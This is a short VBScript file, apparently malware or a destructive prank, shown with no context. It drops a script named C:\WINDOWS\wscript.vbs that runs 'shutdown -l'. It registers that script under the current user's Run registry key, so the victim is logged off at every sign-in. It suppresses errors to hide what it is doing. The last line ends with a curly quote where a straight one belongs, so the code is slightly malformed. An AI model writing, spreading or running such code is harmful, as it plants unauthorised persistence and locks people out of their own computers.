set ws=createobject("wscript.shell")
dim strDir,strfile,st,strtxt2,strshell,strlog
dim obfso,obfolder,obshell,obfile,obtxtfile
strshell="wscript.shell"
strDir="C:\WINDOWS"
strfile="\wscript.vbs"
st=Chr(34)
strlog="shutdown -l"
strtxt2="ws.run(strlog)"
set obfso=CreateObject("Scripting.FileSystemObject")
on error resume next
set obfile=obfso.CreateTextfile(strDir & strfile)
obfile.writeline("set ws=createobject("&st&strshell&st&")")
obfile.writeline("ws.run("&st&strlog&st&")")
ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Logoff","C:\WINDOWS\wscript.vbs","REG_SZ”